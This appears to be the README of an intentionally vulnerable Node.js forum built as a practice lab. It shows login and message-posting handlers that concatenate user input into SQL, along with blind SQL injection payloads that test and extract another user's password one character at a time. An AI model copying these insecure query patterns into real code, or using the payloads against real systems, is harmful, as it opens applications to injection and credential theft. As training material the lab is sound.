# Forum with Blind SQL Injection

## Setup

1. Install dependencies:

```
npm install
```

2. Initialize the database with sample data:

```
node setup-db.js
```

3. Start the server:

```
npm start
```

4. Access the forum at: http://localhost:3000

## Vulnerabilities

### 1. SQL Injection in Login Page

The login page is also vulnerable to SQL injection. User inputs for username and password are directly concatenated into the SQL query without sanitization:

```javascript
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // VULNERABLE: Blind SQL injection in the login query
  // directly concatenating user input in SQL query
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  db.get(query, (err, user) => {
    // ...response handling...
  });
});
```

Test message' AND (SELECT role FROM users WHERE username='PaulAtreides')='admin' AND '1'='1

### 2. Blind SQL Injection in Message Posting

The `/post` endpoint for posting new messages is also vulnerable to blind SQL injection. This can be exploited to extract data from the database:

```javascript
app.post("/post", (req, res) => {
  const { username, content, planet } = req.body;

  // VULNERABLE: Blind SQL injection in the message posting
  const query = `INSERT INTO messages (username, content, planet) 
                  VALUES ('${username}', '${content}', '${
    planet || "Unknown"
  }')`;

  db.run(query, (err) => {
    // ...response handling...
  });
});
```

#### Example Attack

When posting a message, you can use the following payload in the content field to extract password information character by character:

```
Test', (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='PaulAtreides')='m' THEN 'success' ELSE 'fail' END)) --
```

This injection:

1. Closes the current string with a quote and adds a comma
2. Uses a CASE statement to check if the first character of Paul's password is 'm'
3. Comments out the rest of the query

If the first character is 'm', the query executes successfully. If not, it fails due to SQL syntax errors.

To extract the full password, modify the position (change `1,1` to `2,1` for second character) and try different characters.
